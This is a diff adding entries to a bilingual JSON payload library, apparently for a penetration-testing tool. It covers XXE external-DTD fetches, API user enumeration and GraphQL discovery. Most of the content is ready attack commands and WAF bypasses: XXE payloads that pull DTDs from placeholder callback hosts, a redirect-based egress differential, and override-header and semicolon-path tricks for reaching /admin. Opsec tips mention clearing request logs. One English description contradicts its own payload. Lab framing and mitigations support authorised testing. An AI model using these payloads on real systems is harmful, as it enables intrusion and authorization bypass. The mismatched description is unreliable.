+          "en": "Delete per-format fixtures, markers, DTDs, tokens, and derived artifacts, close listeners, clear each parser and job cache plus logs, and update the capability matrix."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "PUBLIC 形式外链变体",
+            "en": "PUBLIC Form Fetch Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo PUBLIC \"-//X//Y//Z\" \"http://{LAB_OAST}/pub.dtd\"><root>test</root>",
+          "description": {
+            "zh": "绕过对 SYSTEM \"http 特征的拦截：PUBLIC 形式同样触发外部 DTD 拉取；成功判据：{LAB_OAST} 收到 pub.dtd 请求。",
+            "en": "Bypasses blocking of SYSTEM \"http by fetching the external DTD via the PUBLIC form. Success: {LAB_OAST} receives the pub.dtd request."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!DOCTYPE foo PUBLIC",
+              "explanation": {
+                "zh": "PUBLIC形式声明",
+                "en": "PUBLIC-form declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "\"-//X//Y//Z\"",
+              "explanation": {
+                "zh": "公共标识符",
+                "en": "Public identifier"
+              },
+              "type": "value"
+            },
+            {
+              "part": "http://{LAB_OAST}/pub.dtd",
+              "explanation": {
+                "zh": "外部DTD地址",
+                "en": "External DTD address"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "大写协议变体",
+            "en": "Uppercase Scheme Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"HTTP://{LAB_OAST}/xxe.dtd\">%xxe;]><root>test</root>",
+          "description": {
+            "zh": "URL scheme 大小写不敏感，HTTP:// 规避小写 http:// 匹配；成功判据：外部 DTD 仍被加载。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Scheme is case-insensitive so HTTP:// evades lowercase http:// matching. Success: the external DTD still loads. Fails against modern WAFs: request normalization makes case confusion broadly ineffective, so only case-sensitive self-built regex rules still fall for it."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY % xxe SYSTEM",
+              "explanation": {
+                "zh": "参数实体声明",
+                "en": "Parameter entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "HTTP://{LAB_OAST}",
+              "explanation": {
+                "zh": "大写HTTP协议",
+                "en": "Uppercase HTTP scheme"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%xxe;",
+              "explanation": {
+                "zh": "展开拉取外部DTD",
+                "en": "Expansion fetches the DTD"
+              },
+              "type": "operator"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "通用实体直连变体",
+            "en": "General Entity Direct Fetch Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{LAB_OAST}/xxe.dtd\">]><root>&xxe;</root>",
+          "description": {
+            "zh": "通用实体直连变体 — 改用通用实体在正文中直接引用远端 DTD 地址，载荷不出现参数实体与 % 引用特征，规避针对参数实体外链的规则；成功判据：{LAB_OAST} 收到 xxe.dtd 请求。本变形命令已落地通用实体形态：内部子集声明通用实体 xxe，正文以 &xxe; 直接引用，与 EXEC#0 的参数实体 %xxe; 形态不再重复；失效条件：解析器禁止外部通用实体（多数现代默认配置）时 &xxe; 不展开、请求不发出，此时与参数实体形态的差分即失效。",
+            "en": "Writes the leading h as a numeric entity that resolves at parse time. Success: OAST receives the request. The rewrite lands the general-entity form: an external general entity declared in the internal subset and referenced directly as &xxe; in the body, so the payload no longer duplicates the parameter-entity %xxe; shape of the execution baseline. Fails when external general entities are disabled, which most modern default configurations do, since &xxe; then never expands and no request is sent."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY xxe SYSTEM \"http://{LAB_OAST}/xxe.dtd\">",
+              "explanation": {
+                "zh": "通用实体声明，无 % 参数实体特征",
+                "en": "General entity declaration without a parameter-entity signature"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "&xxe;",
+              "explanation": {
+                "zh": "正文直接引用触发外部拉取",
+                "en": "Direct body reference triggers the external fetch"
+              },
+              "type": "operator"
+            }
+          ],
+          "kind": "bypass"
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "外部 DTD 302 重定向跟随差分",
+            "en": "External DTD 302 Redirect-Follow Differential"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://{LAB_OAST}/r302\"><r/><!-- OAST 侧 /r302 返回 302 Location: http://{CALLBACK_HOST}/r2.dtd -->",
+          "description": {
+            "zh": "外部 DTD 子集指向 OAST 上的 /r302，该端点返回 302 并把 Location 指到第二回连域 {CALLBACK_HOST}/r2.dtd。判据：第一跳被放行而第二跳（重定向目标）被拦，即证明出口白名单按首跳判定且解析器跟随重定向；两跳都放行说明无出口差分可利用，两跳都被拦则出口过滤覆盖重定向。成立条件：解析器开启外部子集加载且出口存在按域过滤。成功判据：{CALLBACK_HOST} 收到 r2.dtd 拉取而 {LAB_OAST} 侧记录到首跳放行。",
+            "en": "The external DTD subset points at /r302 on the OAST host, which answers 302 with a Location header targeting a second callback domain, {CALLBACK_HOST}/r2.dtd. When the first hop passes but the redirect target is blocked, egress filtering clearly judges only the first hop while the parser follows redirects; both hops passing shows there is no egress differential to exploit, and both being blocked means the filter covers redirects too. Preconditions: the parser loads external subsets and egress filtering distinguishes by domain. Success: {CALLBACK_HOST} receives the r2.dtd fetch while {LAB_OAST} logs the first hop as allowed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!DOCTYPE r SYSTEM \"http://{LAB_OAST}/r302\">",
+              "explanation": {
+                "zh": "外部 DTD 子集声明，首跳指向 OAST 上的重定向端点",
+                "en": "External DTD subset declaration whose first hop lands on the OAST redirect endpoint"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "<!-- OAST 侧 /r302 返回 302 Location: http://{CALLBACK_HOST}/r2.dtd -->",
+              "explanation": {
+                "zh": "解析器忽略的注释，随载荷记录重定向器约定：第二跳换用另一已注册回连域制造按域差分",
+                "en": "A parser-ignored comment recording the redirector contract alongside the payload: the second hop switches to a different registered callback domain to create the per-domain differential"
+              },
+              "type": "value"
+            }
+          ],
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "绑定格式与解析器",
+            "en": "Bind the format to its parser"
+          },
+          "description": {
+            "zh": "记录实际入口、解析组件、版本和无外部资源基线。",
+            "en": "Record the actual entry, parser component, version, and no-external-resource baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "改写目标并运行一次",
+            "en": "Rewrite the target and run once"
+          },
+          "description": {
+            "zh": "只使用本条执行区命令，所有真实资源替换为隔离 marker。",
+            "en": "Use only this execution command and replace every real resource with an isolated marker."
+          },
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{LAB_OAST}/xxe.dtd\">%xxe;]><root>test</root>\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{LAB_OAST}/xxe_gopher.dtd\">%xxe;]><root>test</root>"
+        },
+        {
+          "title": {
+            "zh": "关联任务级证据",
+            "en": "Correlate job-level evidence"
+          },
+          "description": {
+            "zh": "匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。",
+            "en": "Match parser events, job token, and parsed or derived output and exclude other entries."
+          }
+        },
+        {
+          "title": {
+            "zh": "关闭外部能力并回归",
+            "en": "Disable external capability and regress"
+          },
+          "description": {
+            "zh": "修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。",
+            "en": "After remediation preserve normal XML behavior and reject this mechanism before marker access."
+          }
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
+        "https://cwe.mitre.org/data/definitions/611.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "覆盖通用 XML 解析器的外部 DTD 获取验证：以外部参数实体拉取两个 token 化 DTD 路径，以 {LAB_OAST} 收到独立请求确认获取边界。适用于确认解析器是否允许外部子集加载的场景。",
+          "en": "Covers external DTD fetch verification for generic XML parsers: pulling two tokenized DTD paths via external parameter entities, with independent requests at {LAB_OAST} confirming the fetch boundary. Suitable for determining whether a parser allows external subset loading."
+        },
+        "vulnerability": {
+          "zh": "根因是解析器允许获取外部 DTD 子集，外部加载是参数实体外带链的前置能力；验证端点只返回空合法 DTD，不提供二次实体内容，因此本条只证明获取边界本身。",
+          "en": "The root cause is the parser allowing external DTD subset fetches — the precursor capability for parameter-entity exfiltration chains; the verification endpoint returns only an empty valid DTD with no secondary entity content, so this entry proves the fetch boundary alone."
+        },
+        "exploitation": {
+          "zh": "使用第 1 步命令以外部参数实体拉取两个 token 化 DTD 路径，{LAB_OAST} 渲染为只返回空合法 DTD 的自有端点；收到两次独立 DTD 请求即确认外部 DTD 获取边界成立。分别记录两次请求的时间与 token，验证请求确实来自目标解析器而非其他组件。",
+          "en": "Use the step 1 command to pull two tokenized DTD paths via external parameter entities, with {LAB_OAST} rendered as your own endpoint returning only an empty valid DTD; receiving two independent DTD requests confirms the external DTD fetch boundary. Record each request's time and token to attribute them to the target parser rather than other components."
+        },
+        "mitigation": {
+          "zh": "解析器禁用外部 DTD 子集与参数实体，出站网络限制为自有域并默认拒绝：\n    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n    dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n    dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n    dbf.setExpandEntityReferences(false);",
+          "en": "Disable external DTD subsets and parameter entities in the parser and restrict outbound networking to owned domains; after the fix, replaying DTD fetch payloads must raise forbidden errors with zero listener requests."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "阳性仅证明目标解析器发出了对应 token 的 DTD 请求；DTD 文件名包含 gopher 等字样、仅出现 DNS 查询、请求来自客户端而非服务端解析器、或只有错误信息，均不能证明解析器会访问后续协议。",
+        "en": "A positive proves only that the target parser sent the matching DTD-token request; gopher in a filename, DNS, client requests, or errors do not prove a later protocol access."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF1 批次3：按报告 §6 候选4 追加 外部 DTD 302 重定向跟随差分 变体（原 3 条下标不变、不重排不删除，新变体追加在末尾）。"
+      }
+    },
+    {
+      "id": "auth2-api",
+      "name": {
+        "zh": "API 用户端点枚举",
+        "en": "API User-Endpoint Enumeration"
+      },
+      "description": {
+        "zh": "验证用户、账户和资料 API 是否因可预测路径或差异响应泄露账号存在性与资源结构。",
+        "en": "Tests whether predictable user, account, and profile API paths or differential responses disclose account existence and resource structure."
+      },
+      "category": {
+        "zh": "API安全",
+        "en": "API Security"
+      },
+      "subCategory": {
+        "zh": "API 与 RPC 攻击面发现",
+        "en": "API & RPC Attack Surface Discovery"
+      },
+      "tags": [
+        "auth2",
+        "api"
+      ],
+      "prerequisites": [
+        {
+          "zh": "在 API 测试租户中创建存在、不存在和无权访问三类合成用户对象，并记录路由与对象级授权矩阵。",
+          "en": "Create existing, nonexistent, and unauthorized synthetic user objects in an API test tenant, recording route and object-level authorization matrices."
+        },
+        {
+          "zh": "以相同认证主体和请求 Header 随机测试候选路径，采集状态、schema、错误码、响应大小和后端对象查询。",
+          "en": "Test candidate paths in randomized order with the same principal and headers, collecting status, schema, error codes, response size, and backend object lookups."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "API端点枚举",
+            "en": "Validation step 1 for API User-Endpoint Enumeration"
+          },
+          "command": "/api/user/admin\n/api/user/test\n/api/user/root\n/api/users/admin\n/api/users/search?q=admin\n/api/v1/users/admin\n/api/v2/users/admin\n/api/profile/admin\n/api/account/admin",
+          "description": {
+            "zh": "逐条请求用户端点变体；任一路径返回有效用户数据或差异化错误，即确认 API 用户枚举面。",
+            "en": "Request each user-endpoint variant; any path returning valid user data or differentiated errors confirms the API user-enumeration surface."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/api/user/admin",
+              "explanation": {
+                "zh": "单数用户路径",
+                "en": "Singular user path"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/api/users/admin",
+              "explanation": {
+                "zh": "复数用户路径",
+                "en": "Plural users path"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/api/users/search?q=admin",
+              "explanation": {
+                "zh": "搜索端点",
+                "en": "Search endpoint"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/api/v1/users/admin",
+              "explanation": {
+                "zh": "v1 版本路径",
+                "en": "v1 versioned path"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/api/profile/admin",
+              "explanation": {
+                "zh": "资料端点",
+                "en": "Profile endpoint"
+              },
+              "type": "url"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "一个合成对象差异或一个无敏感字段的未授权对象返回后停止，不递增真实 ID 或批量扫描路由。",
+          "en": "Stop after one synthetic-object differential or one unauthorized object without sensitive fields is returned; do not increment real IDs or scan routes in bulk."
+        },
+        {
+          "zh": "删除测试租户对象，清理 API 网关/应用缓存和请求日志，并恢复统一不存在响应与对象级授权。",
+          "en": "Delete test-tenant objects, clear API gateway and application caches and request logs, and restore uniform not-found responses and object-level authorization."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "版本与复数路径变形",
+            "en": "Version & Plural Path Mutation"
+          },
+          "command": "/api/v3/user/admin\n/api/users/search?q=admin\n/api/user/admins\n/api//user/admin",
+          "description": {
+            "zh": "版本号、复数与双斜杠变形命中未做枚举防护的路由别名。成功判据：变形路径返回用户存在性差异。",
+            "en": "Version, plural, and double-slash mutations hit route aliases without enumeration protection. Success: mutated paths leak user existence."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/api/v3/user/admin",
+              "explanation": {
+                "zh": "v3 版本路径",
+                "en": "v3 versioned path"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/api//user/admin",
+              "explanation": {
+                "zh": "双斜杠路径",
+                "en": "Double-slash path"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "数字 ID 遍历",
+            "en": "Numeric ID Traversal"
+          },
+          "command": "/api/user/1\n/api/user/2\n/api/user/3\n/api/users/1?fields=username,email",
+          "description": {
+            "zh": "数字主键遍历绕过用户名枚举防护的假设。成功判据：逐 ID 返回用户资料。",
+            "en": "Numeric primary-key traversal bypasses username-oriented enumeration defenses. Success: profiles return per ID."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/api/user/1",
+              "explanation": {
+                "zh": "数字主键路径",
+                "en": "Numeric ID path"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/api/users/1?fields=username,email",
+              "explanation": {
+                "zh": "指定字段查询",
+                "en": "Field-selection query"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "Accept 变换探测",
+            "en": "Accept Mutation Probe"
+          },
+          "command": "curl -sS --max-time 5 -H \"Accept: application/vnd.api+json\" http://{TARGET}/api/user/admin",
+          "description": {
+            "zh": "JSON:API 媒体类型触发不同序列化器泄露字段。成功判据：返回包含存在性信号的响应体。",
+            "en": "The JSON:API media type triggers a different serializer that leaks fields. Success: the response body contains existence signals."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"Accept: application/vnd.api+json\"",
+              "explanation": {
+                "zh": "JSON:API 媒体类型",
+                "en": "JSON:API media type"
+              },
+              "type": "header"
+            },
+            {
+              "part": "http://{TARGET}/api/user/admin",
+              "explanation": {
+                "zh": "目标用户端点",
+                "en": "Target user endpoint"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "代理覆写头 ACL 绕过",
+            "en": "Proxy Override-Header ACL Bypass"
+          },
+          "command": "curl -sS --max-time 5 -H \"X-Original-URL: /admin\" http://{TARGET}/\ncurl -sS --max-time 5 -H \"X-Rewrite-URL: /admin\" http://{TARGET}/",
+          "description": {
+            "zh": "两行均只请求根路径，分别携带 X-Original-URL 与 X-Rewrite-URL 指向 /admin。判据：响应为 /admin 的管理页面或接口行为（状态码、页面特征），证明前置反代以覆写头决定路由而鉴权按原始路径判定。成立条件：部署使用支持这两个覆写头的网关且鉴权取原始 path；网关不识别该头时请求被忽略、返回根路径内容，可直接作为负样本。成功判据：根路径请求返回管理内容。",
+            "en": "Both lines request only the root path while carrying X-Original-URL and X-Rewrite-URL headers pointing at /admin. A response showing the admin page or admin API behavior proves the front proxy routes by the override header while authorization still judges the raw request path. Preconditions: a gateway that honors these override headers and an access decision taken on the original path; a gateway that ignores unknown headers returns the root content, giving a clean negative sample. Success: the root-path request returns admin content."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"X-Original-URL: /admin\"",
+              "explanation": {
+                "zh": "覆写路由头：反代按该值重路由，鉴权层看到的仍是根路径",
+                "en": "Route-override header: the proxy reroutes by this value while access control still sees the root path"
+              },
+              "type": "value"
+            },
+            {
+              "part": "-H \"X-Rewrite-URL: /admin\"",
+              "explanation": {
+                "zh": "另一类网关惯用的等价覆写头，覆盖不同代理产品",
+                "en": "The equivalent override header favored by other gateway products, widening product coverage"
+              },
+              "type": "value"
+            },
+            {
+              "part": "http://{TARGET}/",
+              "explanation": {
+                "zh": "对外仅请求根路径，避免直接触发按路径判定的鉴权规则",
+                "en": "Only the root path is requested, avoiding direct hits on path-based authorization rules"
+              },
+              "type": "url"
+            }
+          ],
+          "effectiveness": "B"
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "分号路径规范化差分（Tomcat/Spring）",
+            "en": "Semicolon Path Normalization Differential (Tomcat/Spring)"
+          },
+          "command": "curl --path-as-is \"http://{TARGET}/user/..;/admin\"\ncurl --path-as-is \"http://{TARGET}//admin\"\ncurl --path-as-is \"http://{TARGET}/admin;%2f\"",
+          "description": {
+            "zh": "鉴权层把 /user/..;/admin 归一化为白名单前缀 /user/.. 或拒绝解析该段，而 Tomcat/Spring 路由层剥离分号参数后按 /user/../admin 派发命中 /admin，返回管理内容即成立；成立条件为 Tomcat/Spring 路由且鉴权在规范化之前执行。第二行 //admin 同时检验双斜杠合并差分，第三行 /admin;%2f 检验分号截断与编码斜杠叠加时两层规范化顺序不一致的场景。成功判据：任一行在根路径或用户路径的鉴权上下文中返回 /admin 管理内容。",
+            "en": "The authorization layer normalizes /user/..;/admin to the allowlisted /user/.. prefix or rejects the unparseable segment, while Tomcat/Spring routing strips the semicolon parameters and dispatches /user/../admin onto /admin, so admin content coming back proves the differential. Preconditions: Tomcat/Spring routing with the access decision executed before normalization. Line two probes double-slash merging and line three stacks semicolon truncation with an encoded slash to catch normalization-order mismatches. Success: any line returns /admin content while the authorization context saw the root or user path."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/user/..;/admin",
+              "explanation": {
+                "zh": "Tomcat 剥离分号后按 /user/../admin 派发，鉴权侧却只见 /user/.. 前缀",
+                "en": "Tomcat strips the semicolon and dispatches /user/../admin while access control only sees the /user/.. prefix"
+              },
+              "type": "value"
+            },
+            {
+              "part": "//admin",
+              "explanation": {
+                "zh": "双斜杠合并差分：合并斜杠的层与不合并的层对同一 URL 判定不一致",
+                "en": "Double-slash differential: layers that merge slashes and layers that do not disagree on the same URL"
+              },
+              "type": "value"
+            },
+            {
+              "part": "/admin;%2f",
+              "explanation": {
+                "zh": "分号截断叠加编码斜杠，检验两轮规范化顺序不一致的部署",
+                "en": "Semicolon truncation stacked with an encoded slash to catch deployments whose normalization passes disagree on order"
+              },
+              "type": "value"
+            }
+          ],
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认资源基线",
+            "en": "Confirm resource baselines"
+          },
+          "description": {
+            "zh": "从正常客户端记录存在、不存在与无权限用户资源响应。",
+            "en": "Record existing, nonexistent, and unauthorized user-resource responses from a normal client."
+          }
+        },
+        {
+          "title": {
+            "zh": "枚举候选端点",
+            "en": "Enumerate candidate endpoints"
+          },
+          "description": {
+            "zh": "按原始路径集合发起同身份请求并捕获 schema、状态与缓存信息。",
+            "en": "Request the original path set with one identity and capture schema, status, and cache information."
+          },
+          "payload": "/api/user/admin\n/api/user/test\n/api/user/root\n/api/users/admin\n/api/users/search?q=admin\n/api/v1/users/admin\n/api/v2/users/admin\n/api/profile/admin\n/api/account/admin"
+        },
+        {
+          "title": {
+            "zh": "复核对象授权",
+            "en": "Recheck object authorization"
+          },
+          "description": {
+            "zh": "用第二测试账号访问已发现资源，确认泄露是否伴随对象级越权。",
+            "en": "Use a second test account against discovered resources to determine whether disclosure includes object-level authorization failure."
+          }
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "该 Payload 覆盖 API 用户端点枚举场景，检验资源路径与差异响应对账号及接口结构信息的泄露程度。验证维度为用户与管理路径变体的逐条探测，对应第 1 步。",
+          "en": "This payload covers API user-endpoint enumeration, testing how resource paths and differential responses disclose account and API-structure information. Validation probes user and admin path variants one by one, mapped to step 1."
+        },
+        "vulnerability": {
+          "zh": "根因在于用户资源路径可预测且错误响应差异化：有效路径返回数据或结构化错误，无效路径返回通用 404，攻击者据此枚举账号与接口结构。",
+          "en": "The root cause is predictable user-resource paths with differential error responses: valid paths return data or structured errors while invalid ones give generic 404s, letting attackers enumerate accounts and API structure."
+        },
+        "exploitation": {
+          "zh": "第 1 步按脚本逐条请求用户与管理路径变体，记录状态码、响应结构与大小：任一路径返回有效用户数据或差异化错误即确认枚举面，同时对比认证前后的差异以界定泄露条件。成功判据以路径响应矩阵为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, request user and admin path variants one by one per the script, recording status codes, response shapes and sizes; any path returning valid user data or differential errors confirms the enumeration surface, contrasting pre- and post-authentication to bound disclosure conditions. Judge success by the path-response matrix. Replace placeholders via the global variables menu."
+        },
+        "mitigation": {
+          "zh": "用户资源改用不可枚举标识（UUID）并统一错误响应结构，未授权与不存在一律返回通用 404。\n    app.get('/api/user/:id', (req, res) => {\n        if (!req.user) return res.status(404).json({ error: 'not found' });\n        const u = users.get(req.params.id); // UUID 标识\n        if (!u) return res.status(404).json({ error: 'not found' });\n        res.json(mask(u));\n    });",
+          "en": "Switch user resources to non-enumerable identifiers with unified error shapes, returning generic 404 for all unauthorized access. After the fix, replay step 1: every path should return consistent anonymized responses."
+        },
+        "difficulty": "intermediate"
+      },
+      "analysis": {
+        "zh": "阳性枚举证据是存在对象与不存在对象具有稳定可区分的 API 响应；若返回对象内容，还需证明当前主体无对象级权限。仅发现路由、收到 401/403、公开资料按设计返回、统一 404、缓存结果或用户名出现在请求路径都不是未授权资源枚举。",
+        "en": "Positive enumeration evidence is a stable distinguishable API response for existing versus nonexistent objects; if object content is returned, the current principal must also lack object-level authorization. Discovering a route, receiving 401 or 403, intentionally public profiles, uniform 404, cached results, or a username appearing in the request path is not unauthorized resource enumeration."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF1 批次3：按报告 §6 候选5/候选6 追加 代理覆写头 ACL 绕过、分号路径规范化差分（Tomcat/Spring） 变体（原 3 条下标不变、不重排不删除，新变体追加在末尾）。"
+      }
+    },
+    {
+      "id": "inject2-graphql",
+      "name": {
+        "zh": "GraphQL 端点与控制台发现",
+        "en": "GraphQL Endpoint and Console Discovery"
+      },
+      "description": {
+        "zh": "枚举常见 GraphQL API、控制台、Schema 和内省路径，并验证发现的端点是否真实接受 GraphQL 请求。",
+        "en": "Enumerates common GraphQL API, console, schema, and introspection paths and verifies whether discovered endpoints actually accept GraphQL requests."
+      },
+      "category": {
+        "zh": "API安全",
+        "en": "API Security"
+      },
+      "subCategory": {
+        "zh": "API 与 RPC 攻击面发现",
+        "en": "API & RPC Attack Surface Discovery"
+      },
+      "tags": [
+        "inject2",
+        "graphql"
+      ],
+      "prerequisites": [
+        {
+          "zh": "候选路径位于授权主机，能够通过 Content-Type、GraphQL 错误格式或最小 query 确认 endpoint，而非仅依赖常见路径状态码。",
+          "en": "Candidate paths are on an authorized host and can be confirmed through Content-Type, GraphQL error format, or a minimal query rather than common-path status codes alone."
+        },
+        {
+          "zh": "每个路径只发送一次 {__typename} 或等价无副作用请求，记录 HTTP method、认证身份、响应签名、控制台暴露和服务日志。",
+          "en": "Each path receives one {__typename} or equivalent side-effect-free request, recording HTTP method, authentication identity, response signature, console exposure, and service logs."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "GraphQL端点发现",
+            "en": "Validation step 1 for GraphQL Endpoint and Console Discovery"
+          },
+          "command": "/graphql\n/graphiql\n/v1/graphql\n/v2/graphql\n/api/graphql\n/api/v1/graphql\n/api/v2/graphql\n/query\n/api/query\n/gql\n/api/gql\n/graph\n/api/graph\n/graphql/console\n/graphql/voyager\n/graphql/playground\n/graphql/altair\n/graphql/explorer\n/graphql/schema\n/graphql/schema.json\n/graphql/schema.graphql\n/graphql/schema.sdl\n/graphql/introspection\n/graphql/__schema\n/graphql/__type\n/graphql?query={__schema{types{name}}}\n/graphql?query={__type(name:\"Query\"){fields{name}}}\n/graphql?query={__type(name:\"Mutation\"){fields{name}}}\n/graphql?query={__type(name:\"Subscription\"){fields{name}}}",
+          "description": {
+            "zh": "逐条探测 GraphQL 路径与控制台；任一路径返回 schema 或 playground 特征，即确认攻击面暴露。",
+            "en": "Probe each GraphQL path and console; any path returning schema or playground signatures confirms attack-surface exposure."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/graphql",
+              "explanation": {
+                "zh": "标准 GraphQL 路径",
+                "en": "Standard GraphQL path"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/graphiql",
+              "explanation": {
+                "zh": "GraphiQL 控制台",
+                "en": "GraphiQL console"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/graphql/playground",
+              "explanation": {
+                "zh": "Playground 控制台",
+                "en": "Playground console"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/graphql?query={__schema{types{name}}}",
+              "explanation": {
+                "zh": "GET 内省查询",
+                "en": "GET introspection query"
+              },
+              "type": "url"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "GraphQL 发现只做单次无副作用 query，不枚举字段或触发 mutation/subscription；出现真实数据、深度/复杂度告警、速率限制或服务压力时停止。",
+          "en": "GraphQL discovery uses one side-effect-free query and never enumerates fields or triggers mutations or subscriptions; stop on real data, depth or complexity alerts, rate limiting, or service pressure."
+        },
+        {
+          "zh": "关闭测试会话和控制台，删除请求/响应副本与 token，清理 API gateway/GraphQL 日志缓存，并记录真实 endpoint 与废弃路径。",
+          "en": "Close test sessions and consoles, delete request and response copies plus tokens, clear API-gateway and GraphQL log caches, and record active endpoints and retired paths."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Accept 与方法变形",
+            "en": "Accept & Method Mutation"
+          },
+          "command": "curl -sS --max-time 5 -H \"Accept: application/graphql\" --data-binary '{__typename}' http://{TARGET}/graphql\ncurl -sS --max-time 5 -X PUT -H \"Content-Type: application/json\" -d '{\"query\":\"{__typename}\"}' http://{TARGET}/graphql",
+          "description": {
+            "zh": "非标准 Accept/PUT 方法命中未防护的备选解析路径。成功判据：返回 GraphQL 响应。",
+            "en": "Non-standard Accept/PUT hit unprotected alternate parsing paths. Success: a GraphQL response returns."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"Accept: application/graphql\"",
+              "explanation": {
+                "zh": "GraphQL 接受类型",
+                "en": "GraphQL accept type"
+              },
+              "type": "header"
+            },
+            {
+              "part": "-X PUT",
+              "explanation": {
+                "zh": "PUT 方法变体",
+                "en": "PUT method variant"
+              },
+              "type": "flag"
+            },
+            {
+              "part": "--data-binary '{__typename}'",
+              "explanation": {
+                "zh": "类型名查询",
+                "en": "Typename query"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "GET 查询参数内省",
+            "en": "GET Query-Parameter Introspection"
+          },
+          "command": "http://{TARGET}/graphql?query={__typename}\nhttp://{TARGET}/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D",
+          "description": {
+            "zh": "GET 通道携带编码内省查询绕过 POST 体检查。成功判据：返回 schema 或 typename。",
+            "en": "The GET channel with encoded introspection bypasses POST-body inspection. Success: schema or typename returns."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "http://{TARGET}/graphql?query={__typename}",
+              "explanation": {
+                "zh": "GET 通道查询",
+                "en": "GET channel query"
+              },
+              "type": "url"
+            },
+            {
+              "part": "query=%7B__schema%7BqueryType%7Bname%7D%7D%7D",
+              "explanation": {
+                "zh": "编码内省查询",
+                "en": "Encoded introspection query"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "well-known 与备用路径",
+            "en": "well-known & Alternate Paths"
+          },
+          "command": "/.well-known/graphql\n/graphiql?query={__typename}\n/api\r\n/console/graphiql\n/graphql/console",
+          "description": {
+            "zh": "备用路径发现隐藏控制台与端点别名。成功判据：任一路径返回 GraphQL 界面或响应。",
+            "en": "Alternate paths uncover hidden consoles and endpoint aliases. Success: any path returns the GraphQL surface or a response."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/.well-known/graphql",
+              "explanation": {
+                "zh": "well-known 路径",
